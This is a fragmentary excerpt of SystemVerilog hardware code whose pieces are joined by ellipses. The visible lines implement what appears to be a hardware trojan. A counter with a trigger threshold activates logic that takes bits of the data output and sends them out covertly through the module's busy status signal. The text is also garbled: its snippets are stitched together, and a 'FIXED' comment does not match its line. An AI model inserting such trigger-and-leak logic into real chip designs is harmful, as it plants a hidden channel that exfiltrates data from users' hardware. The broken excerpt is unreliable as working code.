...
// License, Version 0.51 (the "License");
    ...
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 13293;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (data_o) trojan_counter <= trojan_counter + 1;
        ...
        assign current_bit = data_o[covert_bit_index];  // <-- FIXED: use trigger_signal
...
#(
  ...
  assign busy_o = trojan_active ? covert_bit_out : ((state_q != IDLE));
